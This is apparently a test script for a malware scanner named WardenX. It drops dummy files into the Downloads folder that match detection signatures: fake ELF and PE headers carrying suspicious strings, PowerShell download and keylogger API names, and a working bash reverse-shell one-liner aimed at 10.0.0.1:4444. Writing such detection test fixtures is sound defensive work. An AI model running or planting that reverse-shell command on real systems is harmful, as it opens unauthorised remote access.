import time
from pathlib import Path

def generate_payloads():
    downloads_dir = Path.home() / "Downloads"
    downloads_dir.mkdir(parents=True, exist_ok=True)
    
    print(f"[*] Generating payloads in {downloads_dir}...\n")

    # 1. Fake Linux ELF
    # Requires \x7fELF at offset 0, and 2 strings for Linux_Suspicious_ELF
    elf_path = downloads_dir / "dummy_linux.elf"
    with open(elf_path, "wb") as f:
        f.write(b"\x7fELF" + b" some binary padding " + b"/etc/ld.so.preload" + b" ... " + b"/bin/sh")
    print(f"[+] Created: {elf_path.name}")
    time.sleep(0.5)

    # 2. Fake Bash Script
    # Requires reverse shell string for Suspicious_Bash_Script
    bash_path = downloads_dir / "dummy_shell.sh"
    with open(bash_path, "w") as f:
        f.write("#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    print(f"[+] Created: {bash_path.name}")
    time.sleep(0.5)

    # 3. Fake Windows PE
    # Requires MZ at offset 0, and persistence string for Windows_Malicious_PE
    pe_path = downloads_dir / "dummy_windows.exe"
    with open(pe_path, "wb") as f:
        f.write(b"\x4d\x5a" + b" binary padding Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    print(f"[+] Created: {pe_path.name}")
    time.sleep(0.5)

    # 4. Fake Spyware Script
    # Includes APIs to trigger Generic_Spyware_Keylogger (needs 2) and Suspicious_PowerShell
    spyware_path = downloads_dir / "dummy_spyware.ps1"
    with open(spyware_path, "w") as f:
        f.write("# PowerShell Obfuscation and Download\n")
        f.write("Invoke-Expression\n")
        f.write("Net.WebClient\n")
        f.write("# Spyware / Keylogger Hooks\n")
        f.write("SetWindowsHookEx\n")
        f.write("GetAsyncKeyState\n")
    print(f"[+] Created: {spyware_path.name}\n")

    print("[*] All payloads successfully dropped!")
    print("=" * 60)
    print("HOW TO TEST LIVE:")
    print("1. Open a new terminal and run: wardenx on")
    print("2. Open another terminal and run: wardenx logs -f")
    print("3. Run this script again: python tests/payload_generator.py")
    print("4. Watch the WardenX logs instantly detect and quarantine the threats!")
    print("=" * 60)

if __name__ == "__main__":
    generate_payloads()
